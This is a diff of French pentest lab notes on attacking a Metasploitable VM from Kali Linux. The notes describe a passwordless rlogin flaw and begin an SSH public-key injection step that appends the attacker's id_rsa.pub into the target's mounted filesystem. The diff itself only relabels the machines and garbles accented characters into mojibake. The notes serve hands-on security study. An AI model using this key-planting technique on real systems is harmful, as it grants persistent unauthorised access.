@@ -1,5 +1,7 @@
-KALI LINUX 192.168.152.130
-METASPOILTABLE 192.168.152.135
+KALI LINUX 192.168.152.130 Fighter
+METASPOILTABLE 192.168.152.135 Defender
+------------------------------------------
+# Commande 
 apt-get update
 SCAN DES PORTS
 
@@ -63,7 +65,7 @@ You have mail.
 root@metasploitable:~#
 
 
-rlogin permet de faire du remote login, il existe uen faille lors'qua clé ssh echangé  si tu essaye de te logguer via rlogin il ne demande plus de mot de passe 
+rlogin permet de faire du remote login, il existe uen faille lors'qua clÃ© ssh echangÃ©  si tu essaye de te logguer via rlogin il ne demande plus de mot de passe 
 
 
 
@@ -274,7 +276,7 @@ lrwxrwxrwx  1 root root    29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-ser
 root@kali:/tmp/ifa#
 
 
-injection ssh clé publique
+injection ssh clÃ© publique
 
 root@kali:/tmp/ifa# cat ~/.ssh/id_rsa.pub >> /tmp/ifa/
 bin/        cdrom/      etc/        initrd/     lib/        media/      nohup.out   proc/       sbin/       sys/        usr/        vmlinuz
